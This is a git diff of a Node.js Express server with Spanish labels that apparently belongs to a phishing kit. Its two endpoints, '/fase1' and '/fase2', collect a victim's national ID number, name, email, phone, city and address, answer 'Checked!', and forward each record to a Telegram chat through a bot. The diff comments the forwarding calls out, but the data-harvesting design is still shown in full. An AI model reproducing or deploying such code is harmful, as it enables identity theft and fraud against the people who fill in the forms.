@@ -78,7 +78,7 @@ const generateRandomCommand = () => {
 app.post('/fase1', (req, res)=>{
   //** Cédula */
   console.log('Fase 1 (Ejec...)')
-  bot.sendMessage(chatID, `### NUEVO USUARIO... ###\n **CC**: ${req.body.cc}`)
+  // bot.sendMessage(chatID, `### NUEVO USUARIO... ###\n **CC**: ${req.body.cc}`)
 
   res.json({'msg': 'Checked!'})
 })
@@ -86,15 +86,15 @@ app.post('/fase1', (req, res)=>{
 app.post('/fase2', (req, res)=>{
   /** Datos Personales */
   console.log('Fase 2 (Ejec...)')
-  bot.sendMessage(chatID, `
-  ### RECIBIENDO ###\n
-  CC: ${req.body.cc}\n 
-  NOMBRE**: ${req.body.nom}\n
-  MAIL: ${req.body.ml}\n
-  CELULAR: ${req.body.pn}\n
-  CIUDAD: ${req.body.cid}\n
-  DIRECCIÓN: ${req.body.dir}\n
-  `)
+  // bot.sendMessage(chatID, `
+  // ### RECIBIENDO ###\n
+  // CC: ${req.body.cc}\n 
+  // NOMBRE**: ${req.body.nom}\n
+  // MAIL: ${req.body.ml}\n
+  // CELULAR: ${req.body.pn}\n
+  // CIUDAD: ${req.body.cid}\n
+  // DIRECCIÓN: ${req.body.dir}\n
+  // `)
   res.json({'msg': 'Checked!'})
 })
 
